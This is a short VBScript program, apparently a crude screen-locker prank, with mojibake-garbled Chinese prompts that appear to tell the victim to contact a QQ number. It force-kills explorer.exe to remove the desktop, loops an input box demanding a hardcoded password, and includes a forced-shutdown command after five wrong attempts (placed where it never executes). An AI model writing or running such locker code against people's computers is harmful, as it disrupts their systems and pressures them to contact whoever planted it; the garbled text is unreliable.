dim mima,suoping,ctr
ctr=0
set suoping=createobject("wscript.shell")
suoping.run "taskkill /im explorer /f"
do
mima=inputbox("�㱻�����ˣ�������ϵQQ��XXXXXXXXXX"+ chr(13) +"������5��������ػ�","����")
if mima="123456789" then
msgbox"�����������ˣ�"
exit do
else
if ctr=5 then
msgbox"886"
exit do
suoping.run "cmd /c shutdown -s -t 0"
else
ctr=ctr+1
msgbox"��������"
end if
end if 
loop


